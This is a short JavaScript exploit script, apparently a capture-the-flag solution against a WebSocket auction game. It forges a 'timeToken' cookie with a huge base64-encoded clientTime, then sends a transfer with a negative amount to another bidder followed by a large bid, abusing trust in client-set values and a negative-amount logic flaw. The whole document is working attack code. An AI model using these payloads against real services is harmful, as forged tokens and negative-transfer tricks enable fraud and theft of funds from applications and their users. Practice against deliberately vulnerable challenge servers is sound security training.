ws = new WebSocket(
  "wss://galactic-gavel.asrctf.online/auction?room=stardust-7sigma-9f3a"
);

document.cookie = `timeToken=${btoa(JSON.stringify({"clientTime":9999999999999999999999999999999999999999999999999999999999999999999999999999999}))}`

ws.onmessage = e => console.log("MSG:", e.data);
ws.onerror = e => console.log("ERR:", e);
ws.onclose = e => console.log("CLOSE:", e.code, e.reason);

ws.onopen = () => {
    ws.send(JSON.stringify({
        type: "transfer",
        target: 'Bidder#be028afc',
        amount: -10000000
    }));

    ws.send(JSON.stringify({
        type: "bid",
        amount: 10000000
    }));
}